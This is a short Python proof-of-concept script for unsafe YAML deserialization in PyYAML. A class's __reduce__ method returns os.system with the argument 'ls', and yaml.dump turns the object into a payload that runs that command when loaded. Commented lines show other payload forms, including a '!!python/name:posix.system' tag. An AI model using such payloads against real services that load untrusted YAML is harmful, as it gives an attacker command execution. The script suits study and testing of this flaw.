import yaml
import os

class test:
	def __init__(self):
		self.pwn = 'pwned'

	def m(self):
		self.value = range(0,10)
		return self.value

	def __reduce__(self):
		#os.system('ls')
		return os.system, ('ls',)


serialized = yaml.dump(test())

print(serialized)

#payload = "!!python/name:posix.system ''"
#payload = serialized
#payload = b'!!python/object/apply:builtins.range [1, 10, 1]'
#unserialzed = yaml.load(payload)
#print(unserialzed)

